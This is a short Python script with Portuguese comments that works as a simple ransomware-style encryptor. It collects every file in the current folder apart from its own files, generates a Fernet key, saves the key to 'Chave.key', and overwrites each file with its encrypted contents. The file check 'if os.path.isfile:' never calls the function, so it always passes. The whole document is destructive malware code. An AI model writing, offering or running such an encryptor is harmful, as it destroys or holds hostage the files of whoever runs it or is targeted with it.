import os
from cryptography.fernet import Fernet
files = []

#procura os arquivos na pasta criada
for file in os.listdir():
    #isso diz pra n pegar o arquivo fonte do codigo se n da problema
    if file == "cybershii.py" or file == "Chave.key" or file == "lauch.json" or file == "securitshii.py":
        continue
    if os.path.isfile:
        files.append(file)
print(files)   
 
 #parte pra gerar a criptografia 
key = Fernet.generate_key()

with open("Chave.key", "wb") as Chave:
    Chave.write(key)

for file in files:
    with open(file, "rb") as arquivos:
        conteudo = arquivos.read()
    conteudo_encrypt = Fernet(key).encrypt(conteudo)
    with open(file, "wb") as arquivos:
        arquivos.write(conteudo_encrypt) 
